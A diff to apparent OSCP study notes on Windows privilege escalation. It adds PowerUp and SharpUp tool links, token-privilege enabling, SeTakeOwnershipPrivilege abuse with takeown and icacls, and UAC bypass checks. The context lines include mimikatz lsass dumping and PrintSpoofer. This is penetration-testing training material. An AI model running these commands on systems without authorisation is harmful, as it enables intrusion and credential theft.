@@ -80,7 +80,9 @@ pagetitle: Windows Privilege Escalation
 	- host it, download it, run it
 	- Can miss stuff, and knowing OSCP it will. 
 - PowerUp powershell script
-	- https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
+	- [https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1]
+- SharpUp ghostpack executable
+	- [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe]
 - Seatbelt
 	- https://github.com/GhostPack/Seatbelt
 	- Full enum: `.\Seatbelt.exe -group=all`
@@ -231,6 +233,9 @@ C:\Users\Public\reverseshell.exe
 **Abusing Privileges to Execute Code as Privileged Users**
 - Can either exploit applications, the kernel, or abuse privileges we have
 - `whoami /priv`
+	- This will return the specific privileges our user has, in either an enabled or disabled state
+	- Disabled just means we need to enable it before using the relevant command
+		- We can enable all privileges using [this powershell script](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)
 - Privilege Abuse:
 	- If we have `SeImpersonatePrivilege`, `SeBackupPrivilege`, `SeAssignPrimaryToken`, `SeLoadDriver`, `SeTakeOwnershipPrivilege` or `SeDebugPrivilege`, we can sometimes perform operations in the security context of another user
 		- With the `SeBackupPrivilege` and `SeRestorePrivilege`, we can read arbitrary files with robocopy: `robocopy /b C:\<path to file> .\<filename>`
@@ -249,6 +254,10 @@ C:\Users\Public\reverseshell.exe
 			- Then, run `mimikatz` (run log so output is in txt) and run `sekurlsa::minidump lsass.dmp`
 		- With `SeTakeOwnershipPrivilege`
 			- Outlined here: https://academy.hackthebox.com/module/67/section/642
+			- We can essentially take ownership of any file, folder, or registry key
+			- Abused with `takeown /f '{path_to_object}'`
+				- This gives us ownership, but we might still not have the proper ACLs, so we need to give them to ourself
+				- `icacls '{path_to_object}' /grant {our_user}:F`
 	- Named pipes:
 		- Allow unrelated processes to share data between each other
 		- If we can coerce a a privileged process into connecting to a controlled named pipe, we can capture the authentication and use `SeImpersonatePrivilege` to impersonate the user account and perform operations in their security context
@@ -272,3 +281,10 @@ C:\Users\Public\reverseshell.exe
 		- Can be used when we have a user with `SeImpersonatePrivilege`
 		- `wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe`
 		- `.\PrintSpoofer64.exe -i -c powershell.exe`
+
+**Bypassing UAC**
+- Windows User Account Control can be bypassed using many different techniques
+- Check if it's running with `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`
+	- Check level with `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin` (5 being the highest level)
+- The bypasses/escalations we can do depend on our Windows version number, which we can get with `[environment]::OSVersion.Version` 
+- The [UACME](https://github.com/hfiref0x/UACME) project maintains a list of bypasses per Windows version number
